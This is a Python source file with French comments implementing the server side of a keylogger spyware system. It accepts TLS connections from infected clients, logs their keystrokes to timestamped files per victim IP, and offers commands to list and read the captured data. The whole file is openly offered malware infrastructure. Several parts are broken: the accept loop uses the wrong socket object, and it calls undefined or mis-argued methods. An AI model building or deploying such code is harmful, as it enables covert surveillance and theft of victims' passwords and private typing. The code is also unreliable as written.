import socket 
import ssl 
import os 
import argparse 
import datetime
import threading

class ServeurSpyware:
    def __init__(self):
       # Mise en place du threading pour lancer le input en meme temps que le serveur 
       input_thread = threading.Thread(target=self.input_user)
       input_thread.daemon = True
       input_thread.start()
    
    def input_user(self):
        # Ajout du input pour saisir des commandes 
        while True:
            commande = input("Entrez une commande: ")
            self.execute_command(commande)
    
    def execute_command(self,commande):
        # Lien des commandes a une fonction 
        if commande == "-k":
            print("Arrêt du serveur Spyware")
            os._exit(0)
        elif commande == "-s":
            self.show_file()
        else:
            print("Commande non reconnu")
    
    def argument(self):
        # Ajout des arguments
        parser = argparse.ArgumentParser(description="Serveur Spyware")
        parser.add_argument("-l","--listen",type=int, help="Port d'écoute du serveur")
        parser.add_argument("-s","--show", action="store_true", help="Affiche les fichiers du répetoire")
        parser.add_argument("-r","--readfile",type=str,help="Affiche le contenu d'un fichier")
        parser.add_argument("-k","--kill",action="store_true",help="Arret du serveur spyware et des clients")

        args = parser.parse_args()
        # Lien des arguments a une fonction 
        if args.listen:
            self.start_server(args.listen)
        elif args.show:
            self.show_files()
        elif args.readfile:
            self.read_file()
        elif args.kill:
            self.kill()
        else:
            parser.print_help()

    def show_files(self): # fonction pour afficher les fichiers reçu par le serveur 
        try:
            directory = os.listdir("/home/spyware/spyware/files")
            print(f"Liste des fichiers reçu par le serveur: {directory}")
        except FileNotFoundError as f:
            print(f"Erreur: {f}")
        except Exception as e:
            print(f"Erreur: {e}")
    
    def read_file(self, filename): # fonction pour la lecture d'un fichier 
        try:
            with open(os.path.join("/home/spyware/spyware/files", filename), "r") as file:
                content = file.read()
                print(f"Lecture du fichier {filename}: \n{content}")
        except FileExistsError as fee:
            print(f"Erreur: {fee}")
        except FileNotFoundError as f:
            print(f"Erreur: {f}")
        except Exception as e:
            print(f"Erreur: {e}")
    

    def data_spyware(self, client_ssl): # fonction pour recevoir les données des clients spyware 
        client_ip = client_ssl.getpeername()[0]
        date_heure = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        file_directory = "/home/spyware/spyware/files"
        file_name = f"{client_ip}-keyboard.txt"
        # On enregistre les donnees sur le fichier 
        try:
            with open(os.path.join(file_directory, file_name),'a') as file:
                while True:
                    data = client_ssl.recv(1024)
                    if not data:
                        break

                    touche_press = data.decode('utf-8')
                    content = (f"{date_heure}: {touche_press}\n")
                    file.write(content)
        except Exception as e:
            print(f"Erreur: {e}")
        finally:
            client_ssl.close() # on ferme la connexion client en cas d'erreur 
    
    def start_server(self, port):
        #Configuration du serveur avec socket 
        host = "192.168.1.24"
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.bind((host, port))
        socket_obj.listen(20)
        print(f"Serveur Lancé sur le port {port}")

        # Configuration de la connexion SSL
        contexte = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        contexte.load_cert_chain("/home/spyware/spyware/certificats/cert/cert_server.pem", "/home/spyware/spyware/certificats/cert/cert-key.pem")
        serveur_ssl = contexte.wrap_socket(socket_obj, server_side=True)

        while True:
            try:
                # Connexion SSL validé on accepte les clients
                client_ssl, client_ip = client_ssl.accept()
                self.data_spyware(client_ssl)
            except Exception as e:
                print(f"Erreur: {e}")

if __name__ == "__main__":
    server = ServeurSpyware()
    server.argument()